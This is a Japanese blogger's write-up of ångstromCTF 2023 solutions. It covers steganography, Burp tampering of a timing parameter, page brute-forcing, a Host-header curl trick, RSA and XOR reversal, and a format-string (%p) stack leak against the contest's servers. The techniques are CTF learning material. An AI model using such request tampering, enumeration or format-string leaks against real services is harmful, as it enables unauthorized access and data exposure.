ångstromCTF 2023に参加したので、writeupを記します。
CTFの結果は580pointで296/1301位でした。

コンテスト: [https://2023.angstromctf.com](https://2023.angstromctf.com)

## misc

### meow

ncするだけ

### sanity check

discordに参加して、generalチャンネルのチャンネルトピックにflagが書いてあった

### Physics HW

この画像が与えられた。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/8jk8brRLnra1KEcctAc4R.png)

青い空を見上げればいつもそこに白い猫 for うさみみハリケーンに突っ込んでみた。
ステガノグラフィー解析で見てみると、怪しいパターンがあった。画像の左上に何かが見える。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/WqqpLoioHPM6CeIGhtMWR.png)

ビット抽出機能を使い、LSBを抽出したところ、flagが表示された。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/hsulaxW93A48h7JVZOps5.png)

### Simon Says

こんな問題がでてきた

```bash
$ nc challs.actf.co 31402
Combine the first 3 letters of lizard with the last 3 letters of lion
```

動物の名前が2つ出るから、1つ目の最初三文字と2つ目の最後三文字をくっつけて入力すればいいらしい。
例えば、lizardとlionならlizionを入力する。それが何個か連続で出題される。

```python
# solve.py
from pwn import *

io = remote('challs.actf.co', 31402)

while True:
    s = io.recvline().decode('utf-8')

    first_index = s.find('first 3 letters of ') + len('first 3 letters of ')
    first = s[first_index:first_index+3]
    last = s[-4:-1]

    io.sendline(first+last)
    print(s)

    if 'actf{' in s:
        break
```

### better me

まさかの生成系AIをハックする問題。時代を感じた。
こんな感じで会話できる
いろいろ解法がありそうで、人のwriteupを見るのが楽しみ。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/FpuX4pTFkmhLhrsIDdoCv.png)

## web

### catch me if you can

画像だと伝わりにくいですが、flagがまあまあな速さでぐるぐる回っていました。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/vJ6qIGUjkPzq8OVN1jo5S.png)

htmlを見るとflagが直書きされていました。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/1rEzi8tdHwj4ALW2AE81K.png)

### Celeste Speedrunning Association

この記録を超える必要があるみたい。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/P216GzM0bRKZTexmpKLsH.png)

/playに飛んでから

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/ifIAEP6yEc3hiNj3VXVOI.png)

Press when done!を押すまでの時間が計測されているみたい。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/W7KXJvxYOKFClrH82K18j.png)

postで時間情報が送られているんじゃないかと推測し、Burpで見てみる。
Press when done!を押したときに出たリクエスト。このstartが/playにアクセスした時刻を表していそう。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/jtOPPTekRPYstXZ6oEVbL.png)

というわけで、startの値を999999999999999999999.99999999999999に設定する。
すると時間はマイナスになるので、flagが取れる。

### shortcircuit

UsernameとPasswordを入力する欄がある。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/fsXUxEvVUayOIHHiFzsUe.png)

Log inを押すと、javascriptが呼ばれてUsernameとPasswordの判定が行われる。
これを解読してflagを得た。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/XPr5fWu2zonQR7HR4RqGQ.png)

### directory

page 0, page 1, page 2……というように、すべてのページを開いて中身を確認する必要がある。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/sXVoXrlnv7oklOlVO7ikp.png)

page 0はこんな感じ。page 1やpage 2も同じページだった。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/sN4CvqVA3PsPJccqslyfN.png)

30分くらいスクリプトを回すと、flagが出てきた。

```python
# solve.py
import requests
for i in range(5000):
    res = requests.get("https://directory.web.actf.co/{}.html".format(i))
    if "your flag is in another file" != res.text:
        print(res.text)
```

### Celeste Tunneling Association

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/ImHOgvDp5u3kAIb4JNMHV.png)

これでフラグが取れました。

```bash
curl https://pioneer.tailec718.ts.net -H "host:flag.local"
```

## crypto

### ranch

```
rtkw{cf0bj_czbv_nv'cc_y4mv_kf_kip_re0kyvi_uivjj1ex_5vw89s3r44901831}
```

シーザー暗号。 rot9してflagをゲット。

```
actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}
```

### impossible

```python
#!/usr/local/bin/python

def fake_psi(a, b):
    return [i for i in a if i in b]

def zero_encoding(x, n):
    ret = []

    for i in range(n):
        if (x & 1) == 0:
            ret.append(x | 1)

        x >>= 1

    return ret

def one_encoding(x, n):
    ret = []

    for i in range(n):
        if x & 1:
            ret.append(x)

        x >>= 1

    return ret

print("Supply positive x and y such that x < y and x > y.")
x = int(input("x: "))
y = int(input("y: "))

if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
    print(open("flag.txt").read())
```

Supply positive x and y such that x < y and x > y.と表示されるものの、実際の判定は、こう。

```python
len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0
```

- one_encodingの挙動
  - 以下を64回繰り返し
    - 引数xが奇数ならxをlistに追加
    - xを1ビット右にシフト
  - listをreturn

- zero_encodingの挙動
  - 以下を64回繰り返し
    - 引数xが偶数ならlistにx+1を追加
    - xを1ビット右にシフト
  - listをreturn

- fake_psiの挙動
  - one_encodingで返されるlistとzero_encodingで返されるlistの中身に重複がなければflagを表示する

one_encodingに渡される引数xに、2進数で64bit以上0が続いて、最上位ビットが1であるような10進数を渡すと、one_encodingから返るlistは空になるため、flagが表示される。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/eDqGYfJbEWCf48Zn7YIZC.png)

### Royal Society of Arts

```python
from Crypto.Util.number import getStrongPrime, bytes_to_long
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)
print("(p-2)*(q-1) =", (p-2)*(q-1))
print("(p-1)*(q-2) =", (p-1)*(q-2))
```

(p-2)(q-1)と(p-1)(q-2)が与えられるので、連立方程式を解けばpとqの値が求まる。
あとはdを求めてcを復号して終わり。

## rev

### checkers

stringsコマンドでflagゲット

```bash
strings checkers | grep actf{
```

### zaza

zazaというファイルを渡された。

```shell
$ file zaza
zaza: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=812da987826b24491d87f1bbad908aa8a99aab97, for GNU/Linux 4.4.0, with debug_info, not stripped
```

とりあえずGhidraに突っ込んで、main関数を解析する。
どうやら、win()を呼び出せばflagが表示されるよう。

![image.png](/images/posts/oXUH4uKNgwlEAqDa0k3wX/WmLz7QcjnweZe5Ovfnyv4.png)

そのために、3つのif文をクリアする必要がある。
まず一つ目

scanfで読み取った値が0x1337であればexit()されずに次に進める。

```C
__isoc99_scanf(&DAT_00102092,&local_60);
if (local_60 != 0x1337) {
    puts("That\'s not enough sheep!");
                    /* WARNING: Subroutine does not return */
    exit(1);
}
```

二つ目
scanfで読み取った値と一つ目の値(0x1337)の積が1だとexit()される。

```C
__isoc99_scanf(&DAT_00102092,&local_5c);
if (local_5c * local_60 == 1) {
    printf("%d %d",(ulong)local_5c,(ulong)(local_60 + local_5c));
    puts("Not good enough for me.");
                    /* WARNING: Subroutine does not return */
    exit(1);
}
```

三つ目
fgets()で受け取った文字列がxor_()に通される。
xor_()を通した後、"2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#"と比較され、一致すればflagが表示される。

```C
fgets(local_58,0x40,stdin);
sVar2 = strcspn(local_58,"\n");
local_58[sVar2] = '\0';
xor_(local_58);
iVar1 = strncmp(local_58,"2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#",0x32);
if (iVar1 != 0) {
    puts("Nope");
                    /* WARNING: Subroutine does not return */
    exit(1);
```

xor_をのぞいてみると、単純に引数と"anextremelycomplicatedkeythatisdefinitelyuselessss"を一文字ずつxorをとっているだけのようだ。

```C
void xor_(long param_1)

{
  size_t sVar1;
  int local_24;

  local_24 = 0;
  while( true ) {
    sVar1 = strlen("anextremelycomplicatedkeythatisdefinitelyuselessss");
    if (sVar1 <= (ulong)(long)local_24) break;
    *(byte *)(param_1 + local_24) =
         *(byte *)(param_1 + local_24) ^
         "anextremelycomplicatedkeythatisdefinitelyuselessss"[local_24];
    local_24 = local_24 + 1;
  }
  return;
}
```

得たい出力は"2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#"なので、
これと"anextremelycomplicatedkeythatisdefinitelyuselessss"のxorをとる。

```python
s1 = "anextremelycomplicatedkeythatisdefinitelyuselessss"
s2 = "2& =$!-( <*+*( ?!&$$6,. )\' $19 , #9=!1 <*=6 <6;66#"
for i, j in zip(s1, s2):
    print(chr(ord(i)^ord(j)), end='')
```

"SHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEP"という文字列が得られる。

回答は以下。0x1337は10進数で4919。

```
$ nc challs.actf.co 32760
I'm going to sleep. Count me some sheep: 4919
Nice, now reset it. Bet you can't: 1
Okay, what's the magic word?
SHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEP
actf{g00dnight_c7822fb3af92b949}
```

## pwn

### queue

ユーザからの入力がそのまま出力されるようだ。
これはFormat String Attackが使えそう。

```bash
$ nc challs.actf.co 31322
What did you learn in class today? %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Oh nice, 0x7ffefaff7040(nil)0x7f5eb434fa370x90x559beaca14900x3e8000000000x559beaca02a00x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x257025702570250x3474737b667463610x75715f74695f6b630x615f74695f6575650x34373964613931360x7d32326234363863(nil)(nil)(nil)(nil)(nil)sounds pretty cool!
```

出てきた16進数を文字列に戻すと、

```
4ts{ftcauq_ti_kca_ti_eue479da916}22b468c
```

が得られる。
これを先頭から8文字ずつ取って、逆順にするとflagが得られる。
